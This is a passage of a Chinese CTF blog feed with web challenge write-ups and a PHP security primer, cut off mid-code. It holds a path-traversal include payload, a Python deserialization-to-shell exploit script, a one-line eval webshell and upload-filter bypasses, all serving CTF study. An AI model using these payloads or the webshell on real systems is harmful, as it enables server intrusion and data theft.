        <content type="html"><![CDATA[<p>来自于BUUCTF_Web解决数最多的[HCTF 2018]WarmUp，小记一下此题被我疏忽的零碎知识以及出题人的脑洞（虽然不大，但是我认为此题不面向wp而是硬做的话不会有这么多解决数 ¯\_(ツ)_/¯</p><span id="more"></span><h1 id="PHP奇怪的目录访问机制"><a href="#PHP奇怪的目录访问机制" class="headerlink" title="PHP奇怪的目录访问机制"></a>PHP奇怪的目录访问机制</h1><p>首先是脑洞，本题hint：<code>flag not here, and flag in ffffllllaaaagggg</code>，这个别致的flag传达的是：flag在上翻4级目录下。这个题上翻4级目录恰好到 linux 根目录，所以有些wp中堆叠很多个<code>../</code>也可以highlight到flag（大概是为了降低脑洞因素的存在感</p><p>再就是本文标题，本题需要在<code>highlight_file(__FILE__)</code>的情况下构造payload绕过其过滤，最后由<code>include</code>包含进来。但是为了绕过其过滤，传给include的路径是：<code>file=hint.php?/../../../../../ffffllllaaaagggg</code>，此路径能打开ffffllllaaaagggg的原因在于<code>hint.php?</code>这个文件并不存在，则php将其视为一个文件夹，flag在上翻 4 层后的目录下，因为已经进了 hint.php? 则还需退回 5 层</p><blockquote>这种访问不存在的目录然后又退回来的操作在linux的shell环境下并不支持，所以说令我感到奇怪</blockquote><p><img src="/images/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6_LinuxShell.PNG"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>miniL p</title>
      <link href="2021/03/25/miniL_web_p/"/>
      <url>2021/03/25/miniL_web_p/</url>
      
        <content type="html"><![CDATA[<p>考察php代码审计，临时文件窗口期的利用，以及linux指令的掌握，对我好难，还好有<code>blackWatch</code>的wp和协助</p><p>（据说是某原题搬运，碍于题量太少而没有找到原题在哪，但是这不重要</p><span id="more"></span><h1 id="miniL-Web-p"><a href="#miniL-Web-p" class="headerlink" title="miniL Web p"></a>miniL Web p</h1><p align='right'><small>这题就叫"p"，没有打错/doge</small></p><p><img src="/images/miniL-Web-p-preview.PNG"></p><h2 id="得到classes-php"><a href="#得到classes-php" class="headerlink" title="得到classes.php"></a>得到classes.php</h2><p>一进来index.php已高亮，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;classes.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>])) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    setcookie(<span class="string">&#x27;git&#x27;</span>, base64_encode(serialize(<span class="keyword">new</span> gitee(<span class="string">&#x27;index.php&#x27;</span>))));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.reload()&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$comp</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>]));</span><br><span class="line">highlight_file(<span class="variable">$comp</span>-&gt;file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">你用上了Git，可是，代价是什么呢（悲）</span><br></pre></td></tr></table></figure><p>index包含了classes.php，根据要求传一个b64的cookie用作反序列化，从而高亮classes.php</p><p>classes.php如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gitee</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;你用上了Git，可是，代价是什么呢（悲）&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">github</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">        <span class="variable">$blacklist</span> = <span class="string">&quot;~!@#%^&amp;*()（）-_&#123;&#125;[]&#x27;\&quot;:,&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(str_split(<span class="variable">$blacklist</span>) <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$char</span>;</span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;cmd, <span class="variable">$char</span>) !== <span class="literal">false</span>) </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;serror&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_REAL_IP&quot;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// proxy_set_header X-Real-IP $remote_addr;</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;across the great ... nope&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你用上了Git，可是，代价是什么呢（悲）</span><br></pre></td></tr></table></figure><h2 id="临时文件窗口期利用"><a href="#临时文件窗口期利用" class="headerlink" title="临时文件窗口期利用"></a><a href="https://www.anquanke.com/post/id/201136">临时文件窗口期利用</a></h2><p>可见本题的解题关键在于<code>eval($this-&gt;cmd)</code>，但在eval执行之前$cmd已经被过滤的只剩个<code>p</code>和一些字符了，而对于此题的解法其实是相对固定的：即使用shell命令调用上传的文件，利用这一窗口期执行任意我们希望服务端执行的shell命令</p><p><img src="/images/miniL-Web-p-timeWindow.PNG"></p><p>如何利用：</p><ul><li><p>首先确定如何在仅有这么小点字符集的情况下访问到上传的临时文件 { Windwos下临时文件保存在<code>C:/Windows/Temp/</code>，命名为php[4个随机字符].tmp；Linux下保存在<code>/tmp/</code>，命名为php[随机6个字符] } 可以确定我们要找的是路径为<code>tmp/phpxxxxxx</code>的文件，结合Linux中的单字符通配符<code>?</code>，就可以找到它了</p>  <center><code>??p/p?p??????</code></center></li><li><p>现在确定上传怎样的文件才可以帮助我们找到flag，注意到反引号 <code>`</code> 没有被过滤，而php中反引号为执行运算符</p>  <blockquote>PHP将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）；使用反引号运算符的效果与函数shell_exec()相同。但这一切的前提是服务端允许一个这么危险的函数执行</blockquote><p>  句号 <code>.</code> 也没有被过滤，这在Linux中可以执行shell script，例如<code>./tmp/hello.sh</code>（但在实际操作中发现这个句号执行需要权限，不能直接打了就来，可能是服务端已经设置好了，所以才能执行），以下是对于shell的大致介绍</p>  <blockquote>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁；Shell 既是一种命令语言，又是一种程序设计语言<br>  需要关注的是 Bash，也就是 Bourne Again Shell，由于易用和免费，Bash 在日常工作中被广泛使用；同时，Bash 也是大多数Linux 系统默认的 Shell<br>  扩展名并不影响脚本执行，sh的后缀完全是为了方便用户理解这个文件大概是什么玩意儿，Linux根据文件头识别文件类型，不需要扩展名<br>  </blockquote><p>  只需基础的两个命令即可帮助我们获取flag：<code>cat</code>和<code>grep</code>，<code>*</code>作为匹配0至任意个字符的通配符，使得cat返回全部根目录下文件信息</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh\ncat /* | grep flag</span></span><br></pre></td></tr></table></figure></li><li><p>最后需要输出执行上述文件后返回的结果，需要用到的是php短标签</p>  <center><code>&#60;&#63;&#61;'233';&#63;&#62;</code> 等价于 <code>&#60;&#63;echo '233';&#63;&#62;</code></center></li></ul><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                  echo的快捷用法，但须在php.ini里打开short_open_tag</span></span><br><span class="line"><span class="comment">#                                          |</span></span><br><span class="line"><span class="comment">#                                          |   尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</span></span><br><span class="line"><span class="comment">#                                          ↓                 ↓</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:1:&#123;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                                            ↑</span></span><br><span class="line"><span class="comment">#                                     执行后面路径下的文件</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                打开根目录下全部文件并显示在标准输出</span></span><br><span class="line"><span class="comment">#                             |</span></span><br><span class="line"><span class="comment">#                             |   查找字符串</span></span><br><span class="line"><span class="comment">#                             ↓      ↓</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&quot;#!/bin/sh\ncat /* | grep flag&quot;</span>&#125;</span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                 ↑         ↑       ↑</span></span><br><span class="line"><span class="comment">#                 |       换行符   pipe，以前面的返回作为参数来执行后面的命令，相当于在根目录里找flag </span></span><br><span class="line"><span class="comment">#                 |</span></span><br><span class="line"><span class="comment">#      #!是一个特殊的表示符，其后跟着解释此脚本的shell路径</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku 社工-初步收集</title>
      <link href="2021/03/24/bugku%20%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/"/>
      <url>2021/03/24/bugku%20%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>真的是非常有趣啊👍</p><p align='right'><small>作者说这个题更像是MISC类...yysy，qs</small></p><span id="more"></span><h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><ul><li><p>进来发现是刷钻软件的index，其中有一地址可以下载一个易语言写的exe</p><p>  <img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-index.PNG"></p></li><li><p>手动添加admin发现管理页面存在，但是一旦尝试注入就会卡死(至少我是这样的)</p></li></ul><p>至此，其他的信息均为干扰，再没有发现任何线索，很显然刷钻exe才是关键</p><h2 id="exe分析"><a href="#exe分析" class="headerlink" title="exe分析"></a>exe分析</h2><h3 id="方法一：抓smtp包"><a href="#方法一：抓smtp包" class="headerlink" title="方法一：抓smtp包"></a>方法一：抓smtp包</h3><p>先看本体，就是一个钓鱼软件</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-exe.PNG"></p><p>最简单也是最常见的钓鱼就是用smtp发邮件出去，但在通过smtp送信时是需要smtp授权码的，故只要抓个smtp包看邮箱和密码即可</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-pack.PNG"></p><p>关键字<code>AUTH LOGIN</code>登录认证，将下文的发送的字段b64decode一下，得到邮箱与密码</p><h3 id="方法二：IDA"><a href="#方法二：IDA" class="headerlink" title="方法二：IDA"></a>方法二：IDA</h3><p>除了抓包查看邮箱与密码，在exe中的邮箱和密码也是保存为静态字段的，拖进IDA去字符串页面找即可</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-IDA.PNG"></p><h2 id="登录邮箱"><a href="#登录邮箱" class="headerlink" title="登录邮箱"></a>登录邮箱</h2><p>需要注意的是我们找到的是smtp授权码，而非邮箱的登陆密码，故不能在网易邮箱直接登录（别问，问就是虽然知道smtp授权码和登陆密码是两码事，但是还是试了好久），面向搜索引擎解题我们得知应该用第三方的邮箱客户端，并选择使用smtp协议登录，例如<code>FoxMail</code>，登录后可以找到管理员补档的被删除的eml格式的附件，foxmail本身或微软自带邮箱就可以打开</p><blockquote>EML格式是微软公司在Outlook中所使用的一种遵循RFC822及其后续扩展的文件格式，并成为各类电子邮件软件的通用格式——百度百科</blockquote><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-mail.PNG"></p><p>打开附件后为邮件对话截图，好心的管理还画出了关键信息，结合题目中提到“社工”，显然此处交代了后台管理的用户名即为发件人署名，密码为生日密码，以此登录后台后稍微翻翻就看到flag啦~</p><p align='right'><small>非常有趣</small></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Basic Requirement</title>
      <link href="2021/03/16/Web_Basic_Requirement/"/>
      <url>2021/03/16/Web_Basic_Requirement/</url>
      
        <content type="html"><![CDATA[<p>系统性收录解决Web题目需要的前置知识，过于零碎的知识未整合</p><span id="more"></span><hr><h1 id="PHP-amp-HTTP"><a href="#PHP-amp-HTTP" class="headerlink" title="PHP&amp;HTTP"></a><big><center>PHP&amp;HTTP</center></big></h1><p align="right"><small>PHP is the best language in the world</small></p><h2 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie,session,token"></a><big>cookie,session,token</big></h2><p>这三个东西的最基本的目的都是区分用户，标识身份，形式不同而已</p><ul><li><p>cookie：小饼干，按F12就可以找到当前页面存放的cookie，本地缓存，由服务器生成，在下次请求时又发回服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用，同时不会占据太多磁盘空间，所以每个域的cookie数量是有限的。由于cookie是人为设置的，所以cookie中可能藏有题目的hint</p></li><li><p>session：会话，服务端临时缓存用户的数据，用户离开网站后立即销毁，python requests中就有保留会话的方法</p></li></ul><p><img src="/images/session.jpg"></p><ul><li>token：因为当用户更换访问的服务器时，若session没有同步到位，则用户又需要重新登陆，token 就解决了这个问题。它将状态保存在客户端，并且借助加密算法进行验证保证安全性</li></ul><p><img src="/images/token.jpg"></p><h2 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a><big>HEADER</big></h2><p>响应头，是服务器以HTTP协议传HTML资料到浏览器前所送出的字串，便于提前判断是否接受请求以及请求的大致信息与属性，按F12就可以查看当前页面的HEADER，HEADER可以自定义，可能包含了题目的hint</p><p>其中有几个重要的HEADER需要了解</p><ul><li><code>X-Forwarded-for</code>：XFF头，含HTTP请求端的IP，但当仅使用这一响应头来验证请求段的真实IP时是不可靠的</li><li><code>Referer</code>：告诉服务器请求来自哪个链接</li><li><code>Content-type</code>：内容类型，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件，文件上传漏洞中常通过更改此 header伪造文件类型标识，请求头部中的Content-type可用大小写绕过，如Content-Type: multipart/form-data;曾在一个题目中将 multipart中的部分字母改为大写即可上传文件；而请求数据中的Content-type则直接复制粘贴即可，不同的后缀名均有对应的描述。例如下图中截包后修改Content-type头，并利用PHP不仅可以解析.PHP文件，包括.PHP2~.PHP5后缀的文件PHP都可以解析，来绕过对.PHP后缀的过滤，并成功上传</li></ul><img src="/images/WebshellUpload.png" style="zoom: 67%;" /><h2 id="PHP标签写法"><a href="#PHP标签写法" class="headerlink" title="PHP标签写法"></a><big>PHP标签写法</big></h2><p>​    有时常见的 php标签会被过滤掉，这就需要尝试更换其他标签来进行尝试</p><p>​    &lt;?php echo ‘hi’; ?&gt;  标准写法</p><p>​    &lt;script language=”php”&gt; echo 1; &lt;/script&gt;  长标签写法，在 php7.0后就不解析了</p><h2 id="松散比较"><a href="#松散比较" class="headerlink" title="松散比较"></a><big>松散比较</big></h2><p>PHP中的比较分为弱比较（==，!=）与强比较（===，!==）两种方式，因为PHP中的变量不用声明其数据类型，导致了在弱比较中的适应性变化</p><img src="/images/PHP弱比较表.png" style="zoom: 50%;" /><p>需要补充的是数字与字符串的弱比较，在进行这类比较时，会先尝试将字符串转为数字，转换规则为：若为非数字开头，则转换为<code>0</code>，若为数字开头，则转换为开头的数字，以下为示例：</p><center><code>"abd"---0</code></center><center><code>"123abc"---123</code></center><center><code>"123.456abc"---123.456</code></center><center><code>"123e4abc"---123e4</code></center><center><code>"233a233"---233</code></center><p>这样的比较，尤其是字符串转数字时科学计数法的识别，为md5的绕过埋下伏笔</p><p>而强比较会先判断数据类型是否一致，在若一致才进行对值的判断，否则直接返回false</p><h2 id="HASH碰撞与绕过"><a href="#HASH碰撞与绕过" class="headerlink" title="HASH碰撞与绕过"></a><big>HASH碰撞与绕过</big></h2><p>MD5码由<code>32</code>个字母或数字组成，因其碰撞概率相对较大，现已是一种不太可靠的Hash算法。针对PHP中的弱比较，强比较，以及md5()函数的特性，有几种常用的绕过方式。</p><ul><li><p>MD5弱比较：0e开头会被识别为科学计数法，<code>md5(aabg7XSs)</code>与 <code>md5(QNKCDZO)</code>的返回值均为 0e开头；md4中也有<code>md4(0e251288019)</code>为<code>0e</code>开头</p></li><li><p>双MD5：<code>md5($a)===md5(md5($b));</code>，传参：<code>a=&amp;b[]=</code></p></li><li><p>MD5与SHA1数组绕过：MD5()与SHA1()都不能处理数组，相当于返回了NULL，虽然会产生WARNING，但它会继续执行啊，于是就这么绕过了，甚至骗过强等于。至于传参，写成：a[]=233&amp;b[]=Oops即可</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">233</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&quot;Oops&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>)===md5(<span class="variable">$b</span>))</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;it s ok&#x27;</span>;</span><br></pre></td></tr></table></figure>  <blockquote>[Out]<br>it s ok</blockquote></li></ul><ul><li><p>MD5碰撞：最经典的是这两串16进制字符串</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexString1</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;</span>;</span><br><span class="line"><span class="variable">$hexString2</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;</span>;</span><br><span class="line"></span><br><span class="line">hex2bin(<span class="variable">$hexString1</span>)===hex2bin(<span class="variable">$hexString2</span>);<span class="comment">//False</span></span><br><span class="line">md5(hex2bin(<span class="variable">$hexString1</span>))===md5(hex2bin(<span class="variable">$hexString2</span>));<span class="comment">//True</span></span><br><span class="line"><span class="comment">//都是008ee33a9d58b51cfeb425b0959121c9</span></span><br><span class="line"><span class="comment">//hex2bin()，十六进制字符串转二进制字符串，要求php version&gt;=5.4</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a><big>超全局变量</big></h2><p>之所以叫做超全局变量，是因为它们在一个脚本的全部作用域中都可用，常见的超全局变量有：</p><center><code>$_GET,$_POST,$_REQUEST,$GLOBALS等</code></center><ul><li><p>GET传参方式为在url后加 <code>/?var_name=value</code>，注意需要url编码</p></li><li><p>POST传参方式为页面内提交表单或用curl，python requests，hackbar等工具，通常不用进行url编码再传输，取决于HTTP HEADER中的”Content-Type“，若为“multipart/form-data”则不需要，若为“application/x-www-form-urlencoded”则需要</p></li><li><p>REQUEST的传参方式包括GET和POST</p></li><li><p>$GLOBALS[index] 作为数组，存储了所有全局变量，变量的名字就是数组的index，包括之前说到的$_GET，$_POST，以及 {定义在当前页面内，在函数外，非类成员} 的变量。对于类中的成员变量，类中函数必须使用$this-&gt;的方式访问，不能用$GLOBALS方式</p><p>  <img src="/images/%E5%89%8D%E7%AB%AF%E8%87%B3%E5%90%8E%E7%AB%AF%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B.png"></p></li></ul><h2 id="正则表达-regex"><a href="#正则表达-regex" class="headerlink" title="正则表达-regex"></a><big><a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md">正则表达-regex</a></big></h2><p>​    <em>基本的正则表达参考链接，在 PHP中存在非常规的正则表达标识，如下表</em></p><table><thead><tr><th>字符</th><th>匹配项目</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>匹配任何字母和数字</td></tr><tr><td>[:alpha:]</td><td>匹配任何字母</td></tr><tr><td>[:blank:]</td><td>匹配blank, tab等空格符</td></tr><tr><td>[:punct:]</td><td>匹配任何标点符号 ‘! “ # $ % &amp; ‘ ( ) * + , - . / : ; &lt; = &gt; ? @ [ \ ] ^ _ ‘ { | } ~’.</td></tr><tr><td>[:digit:]</td><td>匹配任何数字</td></tr><tr><td>[:graph:]</td><td>Graphical characters: ‘[:alnum:]’ and ‘[:punct:]’.</td></tr><tr><td>[:lower:]</td><td>匹配任何小写字母</td></tr><tr><td>[:upper:]</td><td>匹配任何大写字母</td></tr><tr><td>[:print:]</td><td>Printable characters: ‘[:alnum:]’, ‘[:punct:]’, and space.</td></tr></tbody></table><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><big>一句话木马</big></h2><center><code>&lt;?php @eval($_P0ST['key']) ?&gt;</code></center><p><del>因为直接写上去会被报毒，手动把数字0改为字母O就行</del></p><p>原理在于：当有写入了这样代码的文件能够被服务器解析，且解析文件的页面可以访问，我们就可以向该页面POST一个key，其值设为任意希望服务器执行的PHP代码然后被eval执行；基于此，菜刀，蚁剑等 Webshell工具可以连接服务器后台</p><h2 id="swp备份文件"><a href="#swp备份文件" class="headerlink" title=".swp备份文件"></a><big>.swp备份文件</big></h2><p>Linux中 Vim编辑器产生的临时文件，用于备份被编辑的内容以防非正常退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim -r original_file_name.file_type.swp#终端输入此命令可以查看文件</span><br><span class="line">:w file_name.file_type#Vim中输入此命令可以保存文件到终端运行目录</span><br></pre></td></tr></table></figure><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a><big>文件包含漏洞</big></h2><p align="right"><small>特征：xxx.php/?file=xxx</small></p><p>include()函数：检索文件中的php代码，若存在，则执行；反之则输出原文。原本用于优化代码的重用性，但其特性使得这个函数就是造成漏洞的根本</p><ul><li>php伪协议（封装协议）：<ul><li>php://：可以访问各种I/O流，如php://input常用于file_get_contents(php://input)，这样就可以读入用户的输入流。如果直接使用<code>?file=wanted.php</code>会被解析，但想要查看源码，则可以用<code>?file=php://filter/convert.base64-encode/resource=wanted.php</code>，可以得到其b64编码后的源码，这样php://filter就作为中间流，把源码转b64，include()无法执行，于是直接输出b64编码后的源码</li><li>file://：可以访问本地文件，后接目录即可</li><li>还有如zip://，data://等协议，但目前没有做到有需要的题目</li></ul></li><li>文件上传+文件包含：当用户可以上传文件且文件目录可知，同时还存在文件包含，则用户可以通过上传任意包含了一句话木马的文件扔给include()来解析</li></ul><h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a><big>反序列化逃逸</big></h2><p>用户输入要传输到服务器，常需要过滤与序列化，但当过滤步骤放在序列化之后，则可能因为字符串逃逸而造成对象注入</p><ul><li><p>原理：过滤函数造成了序列化返回的字符串内容减少或增加的现象，但没有修改数据长度的标记（如 “php”被替换为 “NONONO”；或 “WHERE”被替换为 “MARK”），又反序列化通过识别 “;}“闭合，后面冗余的内容会被丢弃</p></li><li><p>具体的攻击形式</p><ul><li><p>在此可以先确认需要构造的对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span 